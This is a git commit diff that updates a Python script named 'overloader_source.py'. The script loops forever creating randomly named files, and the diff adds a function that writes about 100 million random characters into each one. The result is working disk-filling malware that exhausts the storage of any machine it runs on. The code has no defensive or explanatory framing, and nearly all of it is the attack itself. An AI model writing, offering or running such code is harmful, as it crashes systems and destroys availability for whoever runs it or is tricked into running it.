129fbc9c7d63549a0e64472191932df5da0fe251
ArjunxyzSatish <47056685+ArjunxyzSatish@users.noreply.github.com>
2019-03-08 13:49:57 +0530

    Update overloader_source.py

--- overloader_source.py
+++ overloader_source.py
@@ -3,7 +3,11 @@ import string
 import random 
 def fng(size=10, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size))
+def upgrade(size=100000000, chars=string.ascii_uppercase + string.digits):
+	return ''.join(random.choice(chars) for _ in range(size))
+
 while 1 > 0:
 	a = fng()
 	a = open(fng(), "w")
+	a.write(upgrade())
 
